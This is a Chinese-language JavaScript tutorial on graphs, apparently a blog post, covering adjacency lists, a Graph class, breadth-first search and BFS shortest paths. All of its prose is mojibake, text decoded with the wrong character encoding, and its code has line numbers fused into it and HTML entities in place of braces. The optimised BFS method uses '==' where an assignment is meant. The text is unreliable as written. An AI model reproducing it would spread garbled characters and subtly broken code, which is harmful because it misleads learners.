ä¸æ˜¯å¼ºè¿žé€šçš„å›¾ï¼ˆç¨€ç–å›¾ï¼‰å¦‚æžœç”¨é‚»æŽ¥çŸ©é˜µæ¥è¡¨ç¤ºï¼Œåˆ™çŸ©é˜µä¸­å°†ä¼šæœ‰å¾ˆå¤š0ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬æµªè´¹äº†è®¡ç®—æœºå­˜å‚¨ç©ºé—´æ¥è¡¨ç¤ºæ ¹æœ¬ä¸å­˜åœ¨çš„è¾¹ã€‚ä¾‹å¦‚ï¼Œæ‰¾ç»™å®šé¡¶ç‚¹çš„ç›¸é‚»é¡¶ç‚¹ï¼Œå³ä½¿è¯¥é¡¶ç‚¹åªæœ‰ä¸€ä¸ªç›¸é‚»çš„é¡¶ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿä¸å¾—ä¸è¿­ä»£ä¸€æ•´è¡Œã€‚é‚»æŽ¥çŸ©é˜µè¡¨ç¤ºæ³•ä¸å¤Ÿå¥½çš„å¦ä¸€ä¸ªç†ç”±æ˜¯ï¼Œå›¾ä¸­é¡¶ç‚¹çš„æ•°é‡å¯èƒ½ä¼šå˜åŒ–ï¼Œè€ŒäºŒç»´æ•°ç»„ä¸å¤ªçµæ´»ã€‚ é‚»æŽ¥è¡¨ é‚»æŽ¥è¡¨æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ç§å«åšé‚»æŽ¥è¡¨çš„åŠ¨æ€æ•°æ®æ¥è¡¨ç¤ºå›¾ã€‚é‚»æŽ¥è¡¨ç”±å›¾ä¸­æ¯ä¸ªé¡¶ç‚¹ç›¸é‚»é¡¶ç‚¹åˆ—è¡¨æ‰€ç»„æˆã€‚å­˜åœ¨å¥½å‡ ç§æ–¹å¼æ¥è¡¨ç¤ºè¿™ç§æ•°æ®ç»“æž„ã€‚æˆ‘ä»¬å¯ä»¥ç”¨åˆ—è¡¨ï¼ˆæ•°ç»„ï¼‰ã€é“¾è¡¨ï¼Œç”šè‡³æ˜¯æ•£åˆ—è¡¨æˆ–è€…æ˜¯å­—å…¸æ¥è¡¨ç¤ºç›¸é‚»é¡¶ç‚¹åˆ—è¡¨ã€‚ä¸‹é¢çš„ç¤ºæ„å›¾å±•ç¤ºäº†é‚»æŽ¥è¡¨ç­‰æ•°æ®ç»“æž„ã€‚ å°½ç®¡é‚»æŽ¥è¡¨å¯èƒ½å¯¹å¤§å¤šæ•°é—®é¢˜æ¥è¯´éƒ½æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œä½†ä»¥ä¸Šä¸¤ç§è¡¨ç¤ºæ³•éƒ½æœ‰ç”¨ï¼Œä¸”å®ƒä»¬æœ‰ç€ä¸åŒçš„æ€§è´¨ï¼ˆä¾‹å¦‚ï¼Œè¦æ‰¾å‡ºé¡¶ç‚¹ vå’Œwæ˜¯å¦ç›¸é‚»ï¼Œä½¿ç”¨é‚»æŽ¥çŸ©é˜µä¼šæ¯”è¾ƒå¿«ï¼‰ã€‚åœ¨æœ¬ç« ä¸­ï¼Œå°±ä¼šä½¿ç”¨é‚»æŽ¥è¡¨è¡¨ç¤ºæ³•ã€‚ å…³è”çŸ©é˜µæˆ‘ä»¬è¿˜å¯ä»¥ç”¨å…³è”çŸ©é˜µæ¥è¡¨ç¤ºå›¾ã€‚åœ¨å…³è”çŸ©é˜µä¸­ï¼ŒçŸ©é˜µçš„è¡Œè¡¨ç¤ºé¡¶ç‚¹ï¼Œåˆ—è¡¨ç¤ºè¾¹ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨äºŒç»´æ•°ç»„æ¥è¡¨ç¤ºä¸¤è€…ä¹‹é—´çš„è¿žé€šæ€§ï¼Œå¦‚æžœé¡¶ç‚¹ v æ˜¯ è¾¹eçš„å…¥å°„ç‚¹ï¼Œåˆ™ array[v][e] === 1,å¦åˆ™ array[v][e] === 0ã€‚ åˆ›å»º Graph ç±»æˆ‘ä»¬å…ˆåˆ›å»ºç±»çš„éª¨æž¶ 1234function Graph()&#123; var vertices = []; var adjList = new Dictionary();&#125; æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨å›¾ä¸­æ‰€æœ‰é¡¶ç‚¹çš„åå­—ï¼Œä»¥åŠä¸€ä¸ªå­—å…¸æ¥å­˜å‚¨é‚»æŽ¥è¡¨ã€‚å­—å…¸å°†ä¼šä½¿ç”¨é¡¶ç‚¹çš„åå­—ä½œä¸ºé”®ï¼Œé‚»æŽ¥é¡¶ç‚¹åˆ—è¡¨ä½œä¸ºå€¼ã€‚ verticesæ•°ç»„å’Œ adjListå­—å…¸ä¸¤è€…éƒ½æ˜¯æˆ‘ä»¬ Graphç±»çš„ç§æœ‰å±žæ€§ã€‚ æŽ¥ç€æˆ‘ä»¬å®žçŽ°ä¸¤ä¸ªæ–¹æ³•ï¼šä¸€ä¸ªç”¨æ¥å‘å›¾ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ï¼ˆå› ä¸ºå›¾å®žä¾‹åŒ–åŽæ˜¯ç©ºçš„ï¼‰ï¼Œå¦å¤–ä¸€ä¸ªæ–¹æ³•ç”¨æ¥æ·»åŠ é¡¶ç‚¹ä¹‹é—´çš„è¾¹ã€‚æˆ‘ä»¬å…ˆå®žçŽ° addVertex æ–¹æ³• 1234this.addVertex = function(v)&#123; vertices.push(v); adjList.set(v,[]);&#125; è¿™ä¸ªæ–¹æ³•æŽ¥å—é¡¶ç‚¹ v ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†è¯¥é¡¶ç‚¹æ·»åŠ åˆ°é¡¶ç‚¹åˆ—è¡¨ä¸­ï¼Œå¹¶ä¸”åœ¨é‚»æŽ¥è¡¨ä¸­ï¼Œè®¾ç½®é¡¶ç‚¹ v ä½œä¸ºé”®å¯¹åº”çš„å­—å…¸å€¼ä¸ºä¸€ä¸ªç©ºæ•°ç»„ã€‚ å®žçŽ° addEdge æ–¹æ³• 1234this.addEdge = function(v,w)&#123; adjList.get(v).push(w); adjList.get(w).push(v); &#125; è¿™ä¸ªæ–¹æ³•æŽ¥å—ä¸¤ä¸ªé¡¶ç‚¹ä½œä¸ºå‚æ•°ã€‚é¦–å…ˆï¼Œé€šè¿‡å°† w åŠ å…¥åˆ° v çš„é‚»æŽ¥è¡¨ä¸­ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€æ¡è‡ªé¡¶ç‚¹ v åˆ°é¡¶ç‚¹ w çš„è¾¹ã€‚å¦‚æžœä½ æƒ³å®žçŽ°ä¸€ä¸ªæœ‰å‘å›¾ï¼Œåˆ™ï¼ˆadjList.get(v).push(w)ï¼‰å°±è¶³å¤Ÿäº†ã€‚ä½†æ˜¯æœ¬ç« ä¸­å¤§å¤šæ•°çš„ä¾‹å­éƒ½æ˜¯åŸºäºŽæ— å‘å›¾ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€æ¡è‡ªwå‘vçš„è¾¹ã€‚ æµ‹è¯• 123456789101112131415const graph = new Graph();const myVertices = ['A','B','C','D','E','F','G','H','I'];for(var i = 0; i &lt; myVertices.length; i++)&#123; graph.addVertex(myVertices[i]);&#125;graph.addEdge('A','B');graph.addEdge('A','C');graph.addEdge('A','D');graph.addEdge('C','D');graph.addEdge('C','G');graph.addEdge('D','G');graph.addEdge('D','H');graph.addEdge('B','E');graph.addEdge('B','F');graph.addEdge('E','I'); å®žçŽ° Graphç±»çš„ toString æ–¹æ³•ï¼Œä¾¿äºŽåœ¨æŽ§åˆ¶å°è¾“å‡ºå›¾ 123456789101112this.toString = function()&#123; var s = ''; for(var i = 0; i &lt; vertices.length; i++)&#123; s += vertices[i] + ' -&gt; '; var neighbors = adjList.get(vertices[i]); for(var j = 0; j &lt; neighbors.length; j++)&#123; s += neighbors[j] + ' '; &#125; s += '\n'; &#125; return s;&#125; æˆ‘ä»¬ä¸ºé‚»æŽ¥è¡¨è¡¨ç¤ºæ³•æž„å»ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé¦–å…ˆè¿­ä»£ vertices æ•°ç»„åˆ—è¡¨ï¼Œå°†é¡¶ç‚¹çš„åå­—åŠ å…¥å­—ç¬¦ä¸²ä¸­ï¼ŒæŽ¥ç€å–å¾—è¯¥é¡¶ç‚¹çš„é‚»æŽ¥è¡¨ï¼ŒåŒæ ·ä¹Ÿè¿­ä»£è¯¥é‚»æŽ¥è¡¨ï¼Œå°†ç›¸é‚»é¡¶ç‚¹åŠ å…¥æˆ‘ä»¬çš„å­—ç¬¦ä¸²ã€‚é‚»æŽ¥è¡¨è¿­ä»£å®ŒæˆåŽï¼Œç»™æˆ‘ä»¬çš„å­—ç¬¦ä¸²æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚è¿™æ ·å°±å¯ä»¥åœ¨æŽ§åˆ¶çœ‹åˆ°ä¸€ä¸ªæ¼‚äº®çš„è¾“å‡ºäº†ã€‚ 123456789A -&gt; B C D B -&gt; A E F C -&gt; A D G D -&gt; A C G H E -&gt; B I F -&gt; B G -&gt; C D H -&gt; D I -&gt; E å›¾çš„éåŽ†å’Œæ ‘æ•°æ®ç»“æž„ç›¸ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®å›¾çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚æœ‰ä¸¤ç§ç®—æ³•å¯ä»¥å¯¹å›¾è¿›è¡ŒéåŽ†ï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBreadth-First Search,BFSï¼‰å’Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDepth-First Search,DFSï¼‰ã€‚å›¾éåŽ†å¯ä»¥ç”¨æ¥å¯»æ‰¾ç‰¹å®šçš„é¡¶ç‚¹æˆ–è€…æ˜¯å¯»æ‰¾ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„è·¯å¾„ï¼Œæ£€æŸ¥å›¾æ˜¯å¦è¿žé€šï¼Œæ£€æŸ¥å›¾æ˜¯å¦å«æœ‰çŽ¯ç­‰ã€‚ å›¾éåŽ†ç®—æ³•çš„æ€æƒ³æ˜¯å¿…é¡»è¿½è¸ªæ¯ä¸ªç¬¬ä¸€æ¬¡è®¿é—®çš„èŠ‚ç‚¹ï¼Œå¹¶ä¸”è¿½è¸ªæœ‰å“ªäº›èŠ‚ç‚¹è¿˜æ²¡æœ‰è¢«å®Œå…¨æŽ¢ç´¢ï¼Œå¯¹äºŽä¸¤ç§å›¾éåŽ†ç®—æ³•ï¼Œéƒ½éœ€è¦æ˜Žç¡®æŒ‡å‡ºç¬¬ä¸€ä¸ªè¢«è®¿é—®çš„èŠ‚ç‚¹ã€‚ å®Œå…¨æŽ¢ç´¢ä¸€ä¸ªé¡¶ç‚¹è¦æ±‚æˆ‘ä»¬æŸ¥çœ‹è¯¥é¡¶ç‚¹çš„æ¯ä¸€æ¡è¾¹ã€‚å¯¹äºŽæ¯ä¸€æ¡è¾¹æ‰€è¿žæŽ¥çš„æ²¡æœ‰è¢«è®¿é—®è¿‡çš„é¡¶ç‚¹ï¼Œå°†å…¶æ ‡æ³¨ä¸ºè¢«å‘çŽ°çš„ï¼Œå¹¶å°†å…¶åŠ å…¥å¾…è®¿é—®çš„é¡¶ç‚¹ã€‚ ä¸ºäº†ä¿è¯ç®—æ³•çš„æ•ˆçŽ‡ï¼ŒåŠ¡å¿…è®¿é—®æ¯ä¸ªé¡¶ç‚¹è‡³å¤šä¸¤æ¬¡ã€‚è¿žé€šå›¾ä¸­æ¯æ¡è¾¹å’Œé¡¶ç‚¹éƒ½ä¼šè¢«è®¿é—®åˆ°ã€‚ å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•å’Œæ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•åŸºæœ¬ä¸Šæ˜¯ç›¸åŒçš„ï¼Œåªæœ‰ä¸€ç‚¹ä¸åŒï¼Œé‚£å°±æ˜¯å¾…è®¿é—®é¡¶ç‚¹åˆ—è¡¨çš„æ•°æ®ç»“æž„ã€‚ ç®—æ³• æ•°æ®ç»“æž„ æè¿° æ·±åº¦ä¼˜å…ˆæœç´¢ æ ˆ é€šè¿‡å°†é¡¶ç‚¹å­˜å…¥æ ˆä¸­ï¼Œé¡¶ç‚¹æ˜¯æ²¿ç€è·¯å¾„è¢«æŽ¢ç´¢çš„ï¼Œå­˜åœ¨æ–°çš„ç›¸é‚»é¡¶ç‚¹å°±åŽ»è®¿é—® å¹¿åº¦ä¼˜å…ˆæœç´¢ é˜Ÿåˆ— é€šè¿‡å°†é¡¶ç‚¹å­˜å…¥é˜Ÿåˆ—ï¼Œæœ€å…ˆå…¥é˜Ÿåˆ—çš„é¡¶ç‚¹å…ˆè¢«æŽ¢ç´¢ å½“è¦æ ‡æ³¨å·²ç»è®¿é—®è¿‡çš„é¡¶ç‚¹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‰ç§é¢œè‰²æ¥æ”¾æ˜ å®ƒä»¬çš„çŠ¶æ€ ç™½è‰²ï¼šè¡¨ç¤ºè¯¥é¡¶ç‚¹è¿˜æ²¡æœ‰è¢«è®¿é—® ç°è‰²ï¼šè¡¨ç¤ºè¯¥é¡¶ç‚¹è¢«è®¿é—®è¿‡ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æŽ¢ç´¢è¿‡ é»‘è‰²ï¼šè¡¨ç¤ºè¯¥é¡¶ç‚¹è¢«è®¿é—®è¿‡ä¸”è¢«å®Œå…¨æŽ¢ç´¢è¿‡ å¹¿åº¦ä¼˜å…ˆæœç´¢å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ä¼šä»ŽæŒ‡å®šçš„ç¬¬ä¸€ä¸ªé¡¶ç‚¹å¼€å§‹éåŽ†å›¾ï¼Œä¼šè®¿é—®å…¶æ‰€æœ‰ç›¸é‚»ç‚¹ï¼Œå°±åƒä¸€æ¬¡è®¿é—®å›¾çš„ä¸€å±‚ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å…ˆå®½åŽæ·±åœ°è®¿é—®é¡¶ç‚¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º ä»¥ä¸‹æ˜¯ä»Žé¡¶ç‚¹ v å¼€å§‹çš„å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•æ‰€éµå¾ªçš„æ­¥éª¤ åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ— Q å°† v æ ‡æ³¨ä¸ºè¢«å‘çŽ°çš„ï¼ˆç°è‰²ï¼‰ï¼Œå¹¶å°† v å…¥é˜Ÿåˆ—Q å¦‚æžœé˜Ÿåˆ—Q éžç©ºï¼Œåˆ™è¿è¡Œä»¥ä¸‹æ­¥éª¤ å°† u ä»Ž Q ä¸­å‡ºé˜Ÿåˆ— å°†æ ‡æ³¨ u ä¸ºè¢«å‘çŽ°çš„ï¼ˆç°è‰²ï¼‰ å°† u æ‰€æœ‰æœªè¢«è®¿é—®è¿‡çš„é‚»ç‚¹ï¼ˆç™½è‰²ï¼‰å…¥é˜Ÿåˆ— å°† u æ ‡æ³¨ä¸ºå·²è¢«æŽ¢ç´¢çš„ï¼ˆé»‘è‰²ï¼‰ å®žçŽ°å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³• 123456789101112131415161718192021222324252627282930// é¢œè‰²è¾…åŠ©-å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•this.initializeColor = function()&#123; var color = []; for(var i = 0; i &lt; vertices.length; i++)&#123; color[vertices[i]] = 'white'; &#125; return color;&#125; // å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•this.bfs = function(v,callback)&#123; var color = this.initializeColor(), queue = new Queue(); queue.enqueue(v); while(!queue.isEmpty())&#123; var u = queue.dequeue(), neighbors = adjList.get(u); color[u] = 'grey'; for(var i = 0; i &lt; neighbors.length; i++)&#123; var w = neighbors[i]; if(color[w] === 'white')&#123; color[w] = 'grey'; queue.enqueue(w); &#125; &#125; color[u] = 'black'; if(callback)&#123; callback(u) &#125; &#125;&#125; å¹¿åº¦ä¼˜å…ˆæœç´¢å’Œæ·±åº¦ä¼˜å…ˆæœç´¢å¤šéœ€è¦æ ‡æ³¨è¢«è®¿é—®è¿‡çš„é¡¶ç‚¹ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªè¾…åŠ©æ•°ç»„ color,ç”±äºŽå½“ç®—æ³•å¼€å§‹æ‰§è¡Œæ—¶ï¼Œæ‰€æœ‰çš„é¡¶ç‚¹é¢œè‰²éƒ½æ˜¯ç™½è‰²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªè¾…åŠ©å‡½æ•° initializeColor ä¸ºè¿™ä¸¤ä¸ªç®—æ³•æ‰§è¡Œæ­¤åˆå§‹åŒ–æ“ä½œã€‚ æˆ‘ä»¬è¦çš„ç¬¬ä¸€ä»¶äº‹æƒ…æ˜¯ç”¨ initializeColor å‡½æ•°æ¥å°† color æ•°ç»„åˆå§‹åŒ–ä¸º white ,æˆ‘ä»¬è¿˜éœ€è¦å£°æ˜Žå’Œåˆ›å»ºä¸€ä¸ª Queue å®žä¾‹ï¼Œå®ƒå°†ä¼šå­˜å‚¨å¾…è®¿é—®å’Œå¾…æŽ¢ç´¢çš„é¡¶ç‚¹ã€‚ bfs æ–¹æ³•æŽ¥å—ä¸€ç‚¹é¡¶ç‚¹ä½œä¸ºç®—æ³•çš„èµ·å§‹ç‚¹ã€‚èµ·å§‹é¡¶ç‚¹æ˜¯å¿…è¦çš„ï¼Œæˆ‘ä»¬å°†æ­¤é¡¶ç‚¹å¦‚é˜Ÿåˆ—ã€‚ å¦‚æžœé˜Ÿåˆ—ä¸ºç©ºï¼Œæˆ‘ä»¬å°†é€šè¿‡å‡ºé˜Ÿåˆ—æ“ä½œä»Žé˜Ÿåˆ—ä¸­ç§»é™¤ä¸€ä¸ªé¡¶ç‚¹ï¼Œå¹¶å–å¾—ä¸€ä¸ªåŒ…å«å…¶æ‰€æœ‰é‚»ç‚¹çš„é‚»æŽ¥è¡¨ã€‚è¯¥é¡¶ç‚¹å°†è¢«æ ‡æ³¨ä¸º grey,è¡¨ç¤ºæˆ‘ä»¬å·²ç»å‘çŽ°äº†å®ƒï¼ˆä½†è¿˜æœªè¢«å®Œå…¨å¯¹å…¶çš„æŽ¢ç´¢ï¼‰ã€‚ å¯¹äºŽ u çš„æ¯ä¸ªé‚»ç‚¹ï¼Œæˆ‘ä»¬å–å¾—å…¶å€¼ï¼Œå¦‚æžœå®ƒè¿˜æœªè¢«è®¿é—®è¿‡ï¼Œåˆ™å°†å…¶æ ‡æ³¨äº†grey,å¹¶å°†è¿™ä¸ªé¡¶ç‚¹åŠ å…¥é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·å½“ä»Žé˜Ÿåˆ—ä¸­å‡ºåˆ—çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å®Œæˆå¯¹å…¶çš„æŽ¢ç´¢ã€‚ å½“å®Œå…¨æŽ¢ç´¢è¯¥é¡¶ç‚¹å’ŒåŠå…¶é‚»ç‚¹åŽï¼Œæˆ‘ä»¬å°†æ ‡æ³¨è¯¥é¡¶ç‚¹ä¸ºå·²æŽ¢ç´¢è¿‡ï¼ˆé»‘è‰²ï¼‰ã€‚ æˆ‘ä»¬å®žçŽ°çš„è¿™ä¸ª bfs æ–¹æ³•ä¹ŸæŽ¥å—ä¸€ä¸ªå›žè°ƒã€‚è¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå¦‚æžœæˆ‘ä»¬ä¼ é€’äº†å›žè°ƒå‡½æ•°ï¼Œä¼šç”¨åˆ°å®ƒã€‚ æµ‹è¯• 1234function printNode(value)&#123; console.log('è®¿é—®äº†é¡¶ç‚¹ï¼š' + value);&#125;graph.bfs(myVertices[0],printNode); å¾—åˆ°ä¸‹é¢çš„ç»“æžœ 123456789è®¿é—®äº†é¡¶ç‚¹ï¼šAè®¿é—®äº†é¡¶ç‚¹ï¼šBè®¿é—®äº†é¡¶ç‚¹ï¼šCè®¿é—®äº†é¡¶ç‚¹ï¼šDè®¿é—®äº†é¡¶ç‚¹ï¼šEè®¿é—®äº†é¡¶ç‚¹ï¼šFè®¿é—®äº†é¡¶ç‚¹ï¼šGè®¿é—®äº†é¡¶ç‚¹ï¼šHè®¿é—®äº†é¡¶ç‚¹ï¼šI é¡¶ç‚¹è®¿é—®é¡ºåºå’Œä¹‹å‰çš„ç¤ºæ„å›¾æ‰€å±•ç¤ºçš„ä¸€è‡´ã€‚ ä½¿ç”¨ BFS å¯»æ‰¾æœ€çŸ­è·¯å¾„ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªå±•ç¤ºäº† BFS ç®—æ³•çš„åŸºæœ¬åŽŸç†ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¯¥ç®—æ³•åšæ›´å¤šäº‹æƒ…ï¼Œè€Œä¸åªæ˜¯è¾“å‡ºè¢«è®¿é—®é¡¶ç‚¹çš„é¡ºåºã€‚ä¾‹å¦‚ï¼Œè€ƒè™‘å¦‚ä½•æ¥è§£å†³ä¸‹é¢çš„é—®é¢˜ã€‚ ç»™å®šä¸€ä¸ªå›¾Gå’Œæºé¡¶ç‚¹vï¼Œæ‰¾å‡ºæ¯ä¸ªé¡¶ç‚¹u,uå’Œvä¹‹é—´æœ€çŸ­çš„è·¯å¾„ï¼ˆä»¥è¾¹çš„æ•°é‡è®¡ï¼‰ å¯¹äºŽç»™å®šé¡¶ç‚¹vï¼Œå¹¿åº¦ä¼˜åŒ–ç®—æ³•ä¼šè®¿é—®æ‰€æœ‰ä¸Žå…¶è·ç¦»ä¸º1çš„é¡¶ç‚¹ï¼ŒæŽ¥ç€æ˜¯è·ç¦»ä¸º2çš„é¡¶ç‚¹ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚æ‰€ä»¥ï¼Œå¯ä»¥ç”¨å¹¿åº¦ä¼˜å…ˆç®—æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å¯ä»¥ä¿®æ”¹bfsæ–¹æ³•ä»¥è¿”å›žç»™æˆ‘ä»¬ä¸€äº›ä¿¡æ¯ï¼š ä»Žvåˆ°uçš„è·ç¦»d[u] å‰æº¯ç‚¹pred[u],ç”¨æ¥æŽ¨å¯¼å‡ºä»Žvåˆ°å…¶ä»–æ¯ä¸ªé¡¶ç‚¹uçš„æœ€çŸ­è·¯å¾„ã€‚ å®žçŽ°ï¼š 123456789101112131415161718192021222324252627282930313233// å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ä¼˜åŒ–ç‰ˆæœ¬this.BFS = function(v)&#123; var color = this.initializeColor(), queue = new Queue(), d = [], pred = []; queue.enqueue(v); for(var i = 0; i &lt; vertices.length; i++)&#123; d[vertices[i]] = 0; pred[vertices[i]] = null; &#125; while(!queue.isEmpty())&#123; var u = queue.dequeue(); neighbors = adjList.get(u); color[u] = 'grey'; for(var i = 0; i &lt; neighbors.length; i++)&#123; // wç›¸é‚»é¡¶ç‚¹ var w = neighbors[i]; if(color[w] === 'white')&#123; color[w] == 'grey'; d[w] = d[u] + 1; pred[w] = u; queue.enqueue(w); &#125; &#125; color[u] = 'black'; &#125; return &#123; distance:d, predecessors: pred &#125;&#125; é¦–å…ˆéœ€è¦å£°æ˜Žæ•°ç»„ d æ¥è¡¨ç¤ºè·ç¦»ï¼Œä»¥åŠ pred æ•°ç»„æ¥è¡¨ç¤ºå‰æº¯ç‚¹ã€‚ä¸‹ä¸€æ­¥ç”¨0æ¥åˆå§‹åŒ–æ•°ç»„dï¼ŒæŠŠpredèµ‹å€¼ä¸º nullã€‚ å½“æˆ‘ä»¬å‘çŽ° é¡¶ç‚¹uçš„ç›¸é‚»ç‚¹wæ—¶ï¼Œåˆ™è®¾ç½®wçš„å‰æº¯ç‚¹å€¼ä¸ºuã€‚æˆ‘ä»¬è¿˜é€šè¿‡ç»™d[u]åŠ 1æ¥è®¾ç½®é¡¶ç‚¹vå’Œç›¸é‚»ç‚¹wä¹‹é—´çš„è·ç¦»ã€‚ æ–¹æ³•çš„æœ€åŽè¿”å›žä¸€ä¸ªåŒ…å«då’Œpredçš„å¯¹è±¡ã€‚ æµ‹è¯• 1234var shortestPathA = graph.BFS(myVertices[0]);console.log(shortestPathA);// distance: [A: 0, B: 1, C: 1, D: 2, E: 2, F: 2, G: 2, H: 3, I: 3]// predecessors: [A: null, B: "A", C: "A", D: "C", E: "B", F: "B",G: "D", , H: "D", , I: "E"] é€šè¿‡å‰æº¯æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™æ®µä»£ç æ¥æž„å»ºä»Žé¡¶ç‚¹Aåˆ°å…¶ä»–é¡¶ç‚¹çš„è·¯å¾„ï¼š 1234567891011121314var fromVertex = myVertices[0];for(var i = 1; i &lt; myVertices.length; i++)&#123; var toVertex = myVertices[i], path = new Stack(); for(var v = toVertex; v !== fromVertex;v = shortestPathA.predecessors[v])&#123; path.push(v); &#125; path.push(fromVertex); var s = path.pop(); while(!path.isEmpty())&#123; s += '-' + path.pop(); &#125; console.log(s);&#125; ä½¿ç”¨é¡¶ç‚¹Aä½œä¸ºæºé¡¶ç‚¹ã€‚å¯¹äºŽæ¯ä¸ªå…¶ä»–é¡¶ç‚¹ï¼Œæˆ‘ä»¬ä¼šJè®¡ç®—é¡¶ç‚¹Aåˆ°å®ƒçš„è·¯å¾„ã€‚æˆ‘ä»¬ä»Žé¡¶ç‚¹æ•°ç»„å¾—åˆ°toVertex ï¼Œç„¶åŽä¼šåˆ›å»ºä¸€ä¸ªæ ˆæ¥ å­˜å‚¨è·¯åŠ²å€¼ã€‚ æŽ¥ç€ï¼Œæˆ‘ä»¬è¿½æº¯ toVertext åˆ° fromVertext çš„è·¯å¾„ã€‚å˜é‡vè¢«èµ‹å€¼ä¸ºå‰æº¯ç‚¹çš„å€¼ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ–¹å‘è¿½æº¯è¿™æ¡è·¯å¾„ã€‚å°†å˜é‡væ·»åŠ åˆ°æ ˆä¸­ã€‚æœ€åŽï¼Œæºé¡¶ç‚¹ä¹Ÿä¼šè¢«æ·»åŠ åˆ°æ ˆä¸­ï¼Œä»¥å¾—åˆ°å®Œæ•´çš„è·¯å¾„ã€‚ è¿™ä¹‹åŽï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªså­—ç¬¦ä¸²ï¼Œå¹¶å°†æºé¡¶ç‚¹èµ‹å€¼ç»™å®ƒã€‚å½“æ ˆæ˜¯éžç©ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä»Žæ ˆä¸­ç§»å‡ºä¸€ä¸ªé¡¹å¹¶å°†å…¶æ‹¼æŽ¥åˆ°å­—ç¬¦ä¸²sçš„åŽé¢ã€‚æœ€åŽåœ¨æŽ§åˆ¶å°ä¸Šè¾“å‡ºè·¯å¾„ã€‚ 12345678A-BA-CA-C-DA-B-EA-B-FA-C-D-GA-C-D-HA-B-E-I æ·±å…¥å­¦ä¹ çš„æœ€çŸ­è·¯å¾„ç®—æ³• æœ¬ç« ä¸­çš„å›¾ä¸æ˜¯åŠ æƒå›¾ã€‚å¦‚æžœè¦è®¡ç®—åŠ æƒå›¾ä¸­çš„æœ€çŸ­è·¯å¾„ï¼ˆä¾‹å¦‚ï¼ŒåŸŽå¸‚A å’ŒåŸŽå¸‚Bä¹‹é—´çš„æœ€çŸ­è·¯å¾„â€”â€”GPSå’ŒGoogle Map ä¸­ç”¨åˆ°çš„ç®—æ³•ï¼‰ï¼Œå¹¿åº¦ä¼˜å…ˆæœç´¢æœªå¿…åˆé€‚ã€‚ ä¸¾ä¸ªæ —å­ï¼ŒDijkstra ç®—æ³•è§£å†³äº†å•æºä¸­æœ€çŸ­è·¯å¾„é—®é¢˜ã€‚Bellman-Ford ç®—æ³•è§£å†³äº†è¾¹æƒå€¼ä¸ºè´Ÿçš„å•æºæœ€çŸ­è·¯å¾„é—®é¢˜ã€‚A*æœç´¢ç®—æ³•è§£å†³äº†æ±‚ä»…ä¸€å¯¹é¡¶ç‚¹é—´çš„æœ€çŸ­è·¯å¾„é—®é¢˜ï¼Œå®ƒç”¨ç»éªŒæ³•åˆ™æ¥åŠ é€Ÿæœç´¢è¿‡ç¨‹ã€‚Floyd-Warshallç®—æ³•è§£å†³äº†æ±‚æ‰€æœ‰é¡¶ç‚¹å¯¹é—´çš„æœ€çŸ­è·¯å¾„çš„è¿™ä¸€é—®é¢˜ã€‚ å›¾æ˜¯ä¸€ä¸ªå¹¿æ³›çš„ä¸»ä½“ï¼Œå¯¹æœ€çŸ­è·¯å¾„åŠå…¶å˜ç§é—®é¢˜ï¼Œæˆ‘ä»¬æœ‰å¾ˆå¤šçš„è§£å†³æ–¹æ¡ˆã€‚ 